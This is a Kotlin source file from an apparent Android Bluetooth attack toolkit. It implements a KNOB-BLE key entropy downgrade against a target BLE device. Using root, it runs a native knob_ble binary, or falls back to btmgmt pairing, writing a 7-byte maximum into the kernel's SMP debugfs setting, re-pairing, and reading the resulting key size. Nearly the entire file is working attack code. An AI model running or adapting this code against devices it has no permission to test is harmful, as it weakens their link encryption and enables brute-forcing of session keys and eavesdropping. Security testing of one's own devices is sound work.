package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Implementation of the KNOB-BLE (Key Entropy Downgrade) attack.
 *
 * This is the BLE variant of the KNOB attack (CVE-2019-9506). While the
 * original KNOB targets BR/EDR LMP key negotiation, KNOB-BLE exploits the
 * BLE Security Manager Protocol (SMP) to force long-term keys (LTK) and
 * session keys to the specification minimum of 7 bytes of entropy. The BLE
 * specification allows key sizes between 7 and 16 bytes, and a compliant
 * device must accept a 7-byte key if requested during SMP pairing.
 *
 * Because the 7-byte minimum is part of the specification, this attack is
 * standard-compliant and stealthy -- no protocol violations are needed.
 * The reduced entropy weakens encryption strength significantly, making
 * brute-force attacks on the session key feasible.
 *
 * The module first checks for a dedicated native binary (`knob_ble`).
 * If that binary is not present, it falls back to btmgmt to initiate a BLE
 * connection, trigger SMP pairing, and probe the negotiated key size from
 * debugfs or kernel logs. The fallback attempts to manipulate SMP key length
 * parameters to force 7-byte entropy and evaluates whether the target
 * accepted the reduced key size.
 *
 * Root is required for all approaches (SMP manipulation, kernel patch for
 * key length forcing). All privileged operations are executed through
 * [RootExecutor].
 */
class KnobBleModule {

    companion object {
        private const val TAG = "KnobBleModule"
        private const val KNOB_BLE_BINARY_PATH = "/data/local/tmp/knob_ble"

        /**
         * Minimum BLE encryption key size allowed by the Bluetooth specification.
         *
         * The BLE SMP allows key sizes between 7 and 16 bytes. A compliant
         * device must accept a 7-byte key if the peer requests it during
         * pairing. This is the target entropy level for the KNOB-BLE attack.
         */
        const val MINIMUM_BLE_KEY_BYTES = 7

        /**
         * Maximum BLE encryption key size supported by the Bluetooth specification.
         *
         * A full-strength BLE link uses 16 bytes of key entropy.
         */
        const val MAXIMUM_BLE_KEY_BYTES = 16
    }

    /** Cancellation flag for [stopAttack]. */
    @Volatile
    private var stopped = false

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Signals the running attack to stop at the next checkpoint.
     *
     * Because the attack is executed as a [Flow], cooperative cancellation
     * via coroutine cancellation is the primary mechanism. This flag serves
     * as an additional signal that long-running shell commands can check.
     */
    fun stopAttack() {
        stopped = true
    }

    /**
     * Executes the KNOB-BLE attack workflow against the target device.
     *
     * The flow:
     * 1. Validate MAC address
     * 2. Verify root access (required, no simulation fallback)
     * 3. Check if the native knob_ble binary exists
     * 4. If it exists, run it with the target MAC
     * 5. Otherwise, use btmgmt-based BLE connection and SMP probing
     *
     * @param targetDevice The BLE device to test.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice): Flow<String> = flow {
        stopped = false
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting KNOB-BLE key entropy downgrade on ${targetDevice.name ?: mac}")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("KNOB-BLE requires root for SMP manipulation and kernel-level key size forcing. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $KNOB_BLE_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native knob_ble binary
            emit("Native knob_ble binary found at $KNOB_BLE_BINARY_PATH")
            emit("Executing: $KNOB_BLE_BINARY_PATH -t $mac")

            val output = RootExecutor.execute("$KNOB_BLE_BINARY_PATH -t $mac")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("knob_ble execution failed.")
            } else {
                emit("knob_ble execution completed.")
            }
        } else {
            // Fallback: use btmgmt to probe the BLE connection
            emit("Native binary not found at $KNOB_BLE_BINARY_PATH")
            emit("Falling back to btmgmt-based BLE key entropy probing...")

            executeBtmgmtApproach(mac)
        }
    }

    /**
     * Uses btmgmt to initiate a BLE connection, trigger SMP pairing, and
     * probe the negotiated key size from the kernel debug filesystem or
     * kernel logs.
     *
     * The approach:
     * 1. Initiate a BLE connection via btmgmt
     * 2. Trigger SMP pairing to establish encryption
     * 3. Read the negotiated key size from debugfs or dmesg
     * 4. Attempt to force 7-byte key entropy by manipulating SMP key length
     * 5. Compare negotiated vs requested entropy
     * 6. Evaluate whether the target accepted reduced key entropy
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeBtmgmtApproach(
        mac: String
    ) {
        // Step 1: Initiate BLE connection via btmgmt
        emit("Initiating BLE connection to $mac via btmgmt...")
        val connResult = RootExecutor.execute("btmgmt find -l -b")
        if (connResult.startsWith("Error")) {
            emit("Failed to initiate BLE scan: $connResult")
            emit("btmgmt may not be available or Bluetooth is disabled.")
            return
        }
        emit("BLE scan result: ${connResult.ifBlank { "OK" }}")

        if (stopped) {
            emit("Attack stopped by user.")
            return
        }

        // Step 2: Trigger SMP pairing to establish an encrypted link
        emit("Triggering SMP pairing with $mac...")
        val pairResult = RootExecutor.execute("btmgmt pair -c 3 -t 1 $mac")
        if (pairResult.startsWith("Error")) {
            emit("SMP pairing failed: $pairResult")
            emit("The target may be out of range, already paired, or not accepting BLE connections.")
            emit("Continuing to check key size from existing pairing data...")
        } else {
            emit("SMP pairing result: ${pairResult.ifBlank { "OK" }}")
        }

        if (stopped) {
            emit("Attack stopped by user.")
            return
        }

        // Step 3: Read negotiated key size from debugfs or kernel logs
        emit("Reading negotiated BLE key size from kernel debug filesystem...")
        val keySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/le_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/long_term_key_size 2>/dev/null"
        )

        var initialKeySize: Int? = null

        if (keySizeResult.startsWith("Error") || keySizeResult.isBlank()) {
            emit("Key size not available from debugfs. Trying kernel logs...")

            // Attempt to read from dmesg as fallback
            val dmesgResult = RootExecutor.execute(
                "dmesg | grep -i 'smp.*key.size\\|enc_key_size\\|key_size' | tail -5"
            )
            if (dmesgResult.startsWith("Error") || dmesgResult.isBlank()) {
                emit("Key size not available from kernel logs either.")
                emit("Ensure debugfs is mounted: mount -t debugfs none /sys/kernel/debug")
            } else {
                emit("Kernel log entries related to key size:")
                for (line in dmesgResult.lines()) {
                    if (line.isNotBlank()) emit("  $line")
                }
                val keySizeMatch = Regex("(\\d+)").find(dmesgResult)
                initialKeySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()
            }
        } else {
            val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
            initialKeySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()
        }

        if (initialKeySize != null) {
            emit("Initial negotiated key size: $initialKeySize bytes")
        } else {
            emit("Could not determine initial key size. Proceeding with entropy forcing attempt...")
        }

        if (stopped) {
            emit("Attack stopped by user.")
            return
        }

        // Step 4: Attempt to force 7-byte key entropy via SMP key length manipulation
        emit("--- SMP Key Entropy Forcing ---")
        emit("Attempting to set maximum key size to $MINIMUM_BLE_KEY_BYTES bytes in SMP parameters...")

        // Write the minimum key size to the SMP configuration via debugfs
        val forceResult = RootExecutor.execute(
            "echo $MINIMUM_BLE_KEY_BYTES > /sys/kernel/debug/bluetooth/hci0/smp_max_key_size 2>/dev/null"
        )
        if (forceResult.startsWith("Error")) {
            emit("Direct SMP key size manipulation failed: $forceResult")
            emit("This requires a kernel patch to expose SMP key size parameters.")
            emit("Trying alternative: setting key size via btmgmt...")

            // Alternative: use btmgmt to set the key size parameter
            val btmgmtForceResult = RootExecutor.execute(
                "btmgmt setting-set le-key-size $MINIMUM_BLE_KEY_BYTES 2>/dev/null"
            )
            if (btmgmtForceResult.startsWith("Error") || btmgmtForceResult.isBlank()) {
                emit("btmgmt key size setting not available.")
                emit("Full KNOB-BLE entropy downgrade requires a patched kernel SMP implementation.")
            } else {
                emit("btmgmt key size setting result: $btmgmtForceResult")
            }
        } else {
            emit("SMP max key size set to $MINIMUM_BLE_KEY_BYTES bytes.")
        }

        if (stopped) {
            emit("Attack stopped by user.")
            return
        }

        // Step 5: Re-pair to force renegotiation with the reduced key size
        emit("Re-initiating SMP pairing to negotiate with reduced key size...")
        val unpairResult = RootExecutor.execute("btmgmt unpair $mac")
        emit("Unpair result: ${unpairResult.ifBlank { "OK" }}")

        val repairResult = RootExecutor.execute("btmgmt pair -c 3 -t 1 $mac")
        if (repairResult.startsWith("Error")) {
            emit("Re-pairing failed: $repairResult")
            emit("Target may have rejected the connection after unpair.")
        } else {
            emit("Re-pairing result: ${repairResult.ifBlank { "OK" }}")
        }

        if (stopped) {
            emit("Attack stopped by user.")
            return
        }

        // Step 6: Read the key size after forced renegotiation
        emit("Reading key size after entropy downgrade attempt...")
        val newKeySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/le_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/long_term_key_size 2>/dev/null || " +
            "dmesg | grep -i 'enc_key_size\\|key.size' | tail -1"
        )

        if (newKeySizeResult.startsWith("Error") || newKeySizeResult.isBlank()) {
            emit("Key size unavailable after renegotiation -- link may have dropped.")
            emit("This can indicate the target rejected the reduced key size.")
            return
        }

        val newKeySizeMatch = Regex("(\\d+)").find(newKeySizeResult)
        val newKeySize = newKeySizeMatch?.groupValues?.get(1)?.toIntOrNull()

        if (newKeySize != null) {
            emit("Negotiated key size after downgrade attempt: $newKeySize bytes")

            // Step 7: Compare and evaluate
            evaluateKeyEntropy(newKeySize, initialKeySize, mac)
        } else {
            emit("Could not parse key size from output. Raw output: $newKeySizeResult")
        }

        // Restore default key size
        emit("Restoring default SMP max key size to $MAXIMUM_BLE_KEY_BYTES bytes...")
        RootExecutor.execute(
            "echo $MAXIMUM_BLE_KEY_BYTES > /sys/kernel/debug/bluetooth/hci0/smp_max_key_size 2>/dev/null"
        )
        emit("Cleanup complete.")
    }

    /**
     * Evaluates the negotiated BLE key entropy against the requested minimum
     * and emits appropriate findings.
     *
     * Compares the post-downgrade key size against the initial key size (if
     * available) and the specification boundaries to determine vulnerability.
     *
     * Threshold tiers:
     *   == 7 bytes: At spec minimum -- KNOB-BLE succeeded, entropy is minimal
     *   8-15 bytes: Partial reduction -- reduced but not at minimum
     *   == 16 bytes: Full key size -- target enforces maximum entropy
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateKeyEntropy(
        negotiatedKeySize: Int,
        initialKeySize: Int?,
        mac: String
    ) {
        if (initialKeySize != null) {
            emit("Comparison: initial=$initialKeySize bytes, negotiated=$negotiatedKeySize bytes " +
                    "(requested=$MINIMUM_BLE_KEY_BYTES bytes)")
        }

        when {
            negotiatedKeySize <= MINIMUM_BLE_KEY_BYTES -> {
                emit("VULNERABILITY CONFIRMED: Key entropy reduced to $negotiatedKeySize bytes " +
                        "(specification minimum).")
                emit("The target accepted the minimum BLE key size of $MINIMUM_BLE_KEY_BYTES bytes.")
                emit("BLE session encryption is operating at minimal entropy. A " +
                        "${MINIMUM_BLE_KEY_BYTES}-byte key has only 2^${MINIMUM_BLE_KEY_BYTES * 8} = " +
                        "2^56 possible values, significantly weakening encryption strength.")
                emit("This attack is standard-compliant -- no protocol violation occurred.")
                Log.w(TAG, "KNOB-BLE vulnerability confirmed on $mac: key entropy $negotiatedKeySize bytes")
            }
            negotiatedKeySize < MAXIMUM_BLE_KEY_BYTES -> {
                emit("PARTIAL REDUCTION: Key entropy is $negotiatedKeySize bytes " +
                        "(above minimum $MINIMUM_BLE_KEY_BYTES, below maximum $MAXIMUM_BLE_KEY_BYTES).")
                if (initialKeySize != null && negotiatedKeySize < initialKeySize) {
                    emit("Key size was reduced from $initialKeySize to $negotiatedKeySize bytes.")
                    emit("The target accepted a reduced key size but not the minimum.")
                } else {
                    emit("The target negotiated $negotiatedKeySize bytes of key entropy.")
                }
                emit("Reduced security margin but not at minimum entropy.")
                Log.d(TAG, "KNOB-BLE partial reduction on $mac: key entropy $negotiatedKeySize bytes")
            }
            else -> {
                emit("Key entropy $negotiatedKeySize bytes. Full BLE key size negotiated.")
                emit("The target enforces maximum key entropy and rejected the downgrade attempt.")
                emit("KNOB-BLE key entropy downgrade was not successful against this device.")
                Log.d(TAG, "KNOB-BLE not vulnerable on $mac: key entropy $negotiatedKeySize bytes")
            }
        }
    }
}
